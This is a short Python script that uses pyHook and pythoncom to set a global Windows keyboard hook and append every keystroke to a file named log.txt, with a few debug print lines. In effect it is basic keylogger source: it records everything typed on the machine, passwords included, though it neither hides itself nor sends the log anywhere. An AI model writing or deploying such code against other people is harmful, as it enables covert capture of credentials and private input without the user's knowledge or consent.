import pyHook
import pythoncom

G_File = open('log.txt','a')
G_File.close()
    

def OnKeyboardEvent(event):
    print("Got event")
    try:
        File = open('log.txt','a')
        File.write(chr(event.Ascii))
        File.close()
    except:
        print("Error reading ascii encodes")
    return True

def gethookready():
    hooks_manager = pyHook.HookManager ( )
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard( )
    print("111done....")
    pythoncom.PumpMessages()
    print("done....")


